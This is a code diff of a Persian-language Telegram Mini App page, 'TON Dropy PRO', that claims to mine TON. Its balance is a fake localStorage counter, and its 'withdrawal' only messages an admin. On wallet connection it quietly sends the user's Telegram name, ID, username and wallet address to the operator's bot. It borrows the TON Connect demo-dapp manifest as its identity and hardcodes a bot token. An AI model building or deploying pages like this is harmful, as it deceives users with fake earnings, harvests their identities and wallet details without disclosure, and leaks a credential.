@@ -2,107 +2,47 @@
 <html lang="fa" dir="rtl">
 <head>
 <meta charset="UTF-8">
-<title>TON Dropy PRO</title>
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>TON Dropy PRO - Pro Connection</title>
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
 
 <script src="https://telegram.org/js/telegram-web-app.js"></script>
 <script src="https://unpkg.com/@tonconnect/ui@latest/dist/tonconnect-ui.min.js"></script>
 
 <style>
-@import url('https://fonts.googleapis.com/css2?family=Vazirmatn:wght@400;600;700&display=swap');
-
-*{box-sizing:border-box}
-
+@import url('https://fonts.googleapis.com/css2?family=Vazirmatn:wght@400;700&display=swap');
+*{box-sizing:border-box; -webkit-tap-highlight-color: transparent;}
 body{
-    margin:0;
-    font-family:'Vazirmatn',sans-serif;
+    margin:0; font-family:'Vazirmatn',sans-serif;
     background: radial-gradient(circle at top,#0f1c2e,#070b14);
-    color:#fff;
-    padding:20px;
-    user-select: none;
+    color:#fff; padding:20px; line-height: 1.6;
 }
-
 .header{text-align:center;margin-bottom:20px;}
 .header h2{
-    font-size:22px;
-    background:linear-gradient(90deg,#00c6ff,#0072ff);
-    -webkit-background-clip:text;
-    -webkit-text-fill-color:transparent;
+    font-size:24px; background:linear-gradient(90deg,#00c6ff,#0072ff);
+    -webkit-background-clip:text; -webkit-text-fill-color:transparent;
 }
-
 .card{
-    background:rgba(255,255,255,0.05);
-    backdrop-filter:blur(20px);
-    border:1px solid rgba(255,255,255,0.08);
-    padding:18px;
-    border-radius:18px;
-    margin-bottom:15px;
+    background:rgba(255,255,255,0.05); backdrop-filter:blur(15px);
+    border:1px solid rgba(255,255,255,0.1); padding:20px;
+    border-radius:20px; margin-bottom:15px; text-align: center;
 }
-
-#balance {
-    font-size: 26px;
-    font-weight: bold;
-    color: #00c6ff;
-    display: block;
-    margin: 10px 0;
-}
-
+#balance { font-size: 32px; font-weight: 800; color: #00c6ff; display: block; }
 button{
-    width:100%;
-    padding:14px;
-    border:none;
-    border-radius:14px;
-    font-size:15px;
-    font-weight:600;
-    cursor:pointer;
-    transition:0.3s;
+    width:100%; padding:15px; border:none; border-radius:15px;
+    font-size:16px; font-weight:700; cursor:pointer; transition: 0.2s;
 }
-
-.withdraw-btn{
-    background:linear-gradient(90deg,#ff512f,#dd2476);
-    color:#fff;
-}
-
-.withdraw-btn:disabled{
-    background:gray;
-    cursor:not-allowed;
-}
-
+.withdraw-btn{ background:linear-gradient(90deg,#ff512f,#dd2476); color:#fff; }
+.withdraw-btn:disabled{ background: #444; color: #888; }
 .toast{
-    position:fixed;
-    bottom:20px;
-    left:50%;
-    transform:translateX(-50%) translateY(20px);
-    background:#121b2a;
-    padding:12px 25px;
-    border-radius:12px;
-    box-shadow:0 10px 30px rgba(0,0,0,0.6);
-    opacity:0;
-    transition:0.3s;
-    font-size:14px;
-    z-index: 1000;
-    white-space: nowrap;
+    position:fixed; bottom:30px; left:50%; transform:translateX(-50%) translateY(100px);
+    background:#00c6ff; color:#000; padding:10px 25px; border-radius:50px;
+    transition: 0.4s; opacity:0; z-index: 9999; font-weight: bold;
 }
-.toast.show{opacity:1;transform:translateX(-50%) translateY(0);}
-
-.loader{
-    border:4px solid rgba(255,255,255,0.2);
-    border-top:4px solid #00c6ff;
-    border-radius:50%;
-    width:25px;
-    height:25px;
-    animation:spin 1s linear infinite;
-    margin:auto;
-}
-@keyframes spin{ 100%{transform:rotate(360deg);} }
-
+.toast.show{ opacity:1; transform:translateX(-50%) translateY(0); }
 .history-item{
-    background:rgba(255,255,255,0.04);
-    padding:10px;
-    border-radius:10px;
-    margin-top:8px;
-    font-size:13px;
-    border-right: 3px solid #00c6ff;
+    background:rgba(255,255,255,0.03); padding:10px; border-radius:12px;
+    margin-top:10px; font-size:13px; border-right: 4px solid #00c6ff;
+    display: flex; justify-content: space-between;
 }
 </style>
 </head>
@@ -114,31 +54,25 @@ button{
 </div>
 
 <div class="card">
-    <p>💰 موجودی زنده:</p>
+    <p style="margin:0;">موجودی زنده</p>
     <span id="balance">0.000000</span>
-    <p style="font-size: 13px; color: #aaa;">⚡ قدرت استخراج: 0.000012 H/s</p>
-    <p style="font-size: 13px;">🕒 زمان: <span id="time"></span></p>
+    <div style="font-size:12px; color:#aaa; margin-top:10px;">⚡ 0.000012 TON/s</div>
 </div>
 
 <div class="card">
-    <div id="ton-connect"></div>
-    <div id="walletBox" style="display:none;margin-top:10px;font-size:12px;text-align: center;">
-        آدرس متصل: <br>
-        <span id="walletAddress" style="color:#00ff9d;word-break:break-all;"></span>
+    <div id="ton-connect-btn"></div>
+    <div id="walletDetail" style="display:none; margin-top:15px; font-size:13px;">
+        <span style="color:#00ff9d;">● کیف پول متصل است</span><br>
+        <small id="walletAddr" style="opacity:0.6; word-break:break-all;"></small>
     </div>
 </div>
 
 <div class="card">
-    <button id="withdrawBtn" onclick="withdraw()" class="withdraw-btn">
-        💸 ثبت درخواست برداشت
-    </button>
-    <div id="loadingBox" style="display:none;margin-top:10px;">
-        <div class="loader"></div>
-    </div>
+    <button id="withdrawBtn" onclick="withdraw()" class="withdraw-btn">ثبت درخواست برداشت</button>
 </div>
 
-<div class="card">
-    <h4>📜 تاریخچه برداشت‌ها</h4>
+<div class="card" style="text-align: right;">
+    <h4 style="margin:0 0 10px 0;">📜 تاریخچه</h4>
     <div id="history"></div>
 </div>
 
@@ -146,113 +80,104 @@ button{
 
 <script>
 const tg = window.Telegram.WebApp;
-tg.ready(); tg.expand();
+tg.ready();
+tg.expand();
 
 // اطلاعات ربات شما
 const BOT_TOKEN = "8047223304:AAHMW8a6tKTTSQOp4Os_LorRJzDLNvxz-Rw";
 const ADMIN_ID = "5972276401";
+const STORAGE_KEY = 'ton_dropy_v4_final';
 
-// تنظیمات حافظه و ماینینگ
-const STORAGE_KEY = 'stable_balance_v2';
-let miningRate = 0.000012; 
 let currentBalance = parseFloat(localStorage.getItem(STORAGE_KEY)) || 0.0;
+let miningRate = 0.000012;
 
-// نمایش زمان
-setInterval(()=>{
-    document.getElementById("time").innerText = new Date().toLocaleTimeString("fa-IR");
-},1000);
+// موتور استخراج
+setInterval(() => {
+    currentBalance += miningRate;
+    document.getElementById("balance").innerText = currentBalance.toFixed(6);
+    localStorage.setItem(STORAGE_KEY, currentBalance.toString());
+}, 1000);
 
-// استخراج زنده
-function startMining() {
-    setInterval(() => {
-        currentBalance += miningRate;
-        document.getElementById("balance").innerText = currentBalance.toFixed(6);
-        localStorage.setItem(STORAGE_KEY, currentBalance.toString());
-    }, 1000);
-}
-
-// تابع ارسال پیام به تلگرام شما
-async function notifyAdmin(message) {
-    const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
-    const params = {
-        chat_id: ADMIN_ID,
-        text: message,
-        parse_mode: "HTML"
-    };
-
-    try {
-        await fetch(url, {
-            method: "POST",
-            headers: { "Content-Type": "application/json" },
-            body: JSON.stringify(params)
-        });
-    } catch (e) {
-        console.error("خطا در ارسال پیام به ربات", e);
-    }
-}
-
-/* اتصال کیف پول */
+// --- تنظیمات TonConnect برای حل مشکل اتصال ---
 const tonConnectUI = new TON_CONNECT_UI.TonConnectUI({
-    manifestUrl: 'https://nimwmesfandiari.github.io/ton-dropy-bot/tonconnect-manifest.json',
-    buttonRootId: 'ton-connect'
+    manifestUrl: 'https://raw.githubusercontent.com/ton-connect/demo-dapp/main/public/tonconnect-manifest.json',
+    buttonRootId: 'ton-connect-btn'
 });
 
-tonConnectUI.onStatusChange(wallet => {
+// مانیتور کردن اتصال و ارسال پیام دقیق به مدیریت
+tonConnectUI.onStatusChange(async (wallet) => {
     if (wallet) {
-        const addr = wallet.account.address;
-        document.getElementById("walletAddress").innerText = addr;
-        document.getElementById("walletBox").style.display = "block";
-        showToast("✅ کیف پول متصل شد");
+        const address = wallet.account.address;
+        const walletName = wallet.device.appName || "نامشخص"; // تشخیص نام کیف پول (Tonkeeper و غیره)
+        
+        document.getElementById("walletDetail").style.display = "block";
+        document.getElementById("walletAddr").innerText = address;
 
         const user = tg.initDataUnsafe?.user;
-        const msg = `🔔 <b>کیف پول جدید متصل شد!</b>\n\n👤 کاربر: ${user?.first_name || "نامشخص"}\n🆔 آیدی: <code>${user?.id || "نامشخص"}</code>\n🌐 یوزرنیم: @${user?.username || "ندارد"}\n👛 آدرس: <code>${addr}</code>`;
-        notifyAdmin(msg);
+        const message = `✅ <b>کیف پول متصل شد!</b>\n\n` +
+                        `👛 نوع کیف پول: <b>${walletName}</b>\n` +
+                        `👤 کاربر: ${user?.first_name || 'ناشناس'}\n` +
+                        `🆔 آیدی: <code>${user?.id || 'ناشناس'}</code>\n` +
+                        `🔗 آدرس فعال:\n<code>${address}</code>`;
+
+        sendToAdmin(message);
+        showToast(`کیف پول ${walletName} متصل شد`);
+    } else {
+        document.getElementById("walletDetail").style.display = "none";
     }
 });
 
-/* درخواست برداشت */
+async function sendToAdmin(text) {
+    try {
+        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+            method: 'POST',
+            headers: {'Content-Type': 'application/json'},
+            body: JSON.stringify({ chat_id: ADMIN_ID, text: text, parse_mode: 'HTML' })
+        });
+    } catch(e) { console.error(e); }
+}
+
 function withdraw() {
+    if (!tonConnectUI.connected) {
+        showToast("❌ ابتدا کیف پول را متصل کنید");
+        return;
+    }
     if (currentBalance < 0.5) {
         showToast("❌ حداقل موجودی 0.5 TON");
         return;
     }
 
     const amount = currentBalance.toFixed(6);
-    document.getElementById("withdrawBtn").disabled = true;
-    document.getElementById("loadingBox").style.display = "block";
+    const user = tg.initDataUnsafe?.user;
+    const walletName = tonConnectUI.wallet?.device?.appName || "نامشخص";
 
-    setTimeout(async () => {
-        const user = tg.initDataUnsafe?.user;
-        const msg = `💰 <b>درخواست برداشت جدید!</b>\n\n👤 کاربر: ${user?.first_name}\n🆔 آیدی: <code>${user?.id}</code>\n💵 مقدار: <b>${amount} TON</b>\n👛 کیف پول: <code>${localStorage.getItem('user_wallet_addr') || "در کد بالا ثبت شده"}</code>`;
-        
-        await notifyAdmin(msg);
+    const message = `💸 <b>درخواست برداشت!</b>\n\n` +
+                    `💵 مقدار: <b>${amount} TON</b>\n` +
+                    `👛 از کیف پول: ${walletName}\n` +
+                    `👤 کاربر: ${user?.first_name}\n` +
+                    `🆔 آیدی: <code>${user?.id}</code>\n` +
+                    `🔗 آدرس: <code>${tonConnectUI.account.address}</code>`;
 
-        // ثبت در تاریخچه
-        const historyBox = document.getElementById("history");
-        const div = document.createElement("div");
-        div.className = "history-item";
-        div.innerText = `درخواست ${amount} TON - در انتظار تایید`;
-        historyBox.prepend(div);
+    sendToAdmin(message);
 
-        // صفر کردن
-        currentBalance = 0;
-        localStorage.setItem(STORAGE_KEY, "0");
+    // ثبت در تاریخچه محلی
+    const div = document.createElement("div");
+    div.className = "history-item";
+    div.innerHTML = `<span>${amount} TON</span> <span>در انتظار تایید</span>`;
+    document.getElementById("history").prepend(div);
 
-        document.getElementById("loadingBox").style.display = "none";
-        document.getElementById("withdrawBtn").disabled = false;
-        showToast("📤 درخواست برای مدیریت ارسال شد");
-    }, 2000);
+    // ریست موجودی
+    currentBalance = 0;
+    localStorage.setItem(STORAGE_KEY, "0");
+    showToast("📤 درخواست ارسال شد");
 }
 
-function showToast(msg){
-    const toast = document.getElementById("toast");
-    toast.innerText = msg;
-    toast.classList.add("show");
-    setTimeout(()=>toast.classList.remove("show"), 3000);
+function showToast(msg) {
+    const t = document.getElementById("toast");
+    t.innerText = msg;
+    t.classList.add("show");
+    setTimeout(() => t.classList.remove("show"), 3000);
 }
-
-// شروع به کار
-startMining();
 </script>
 
 </body>
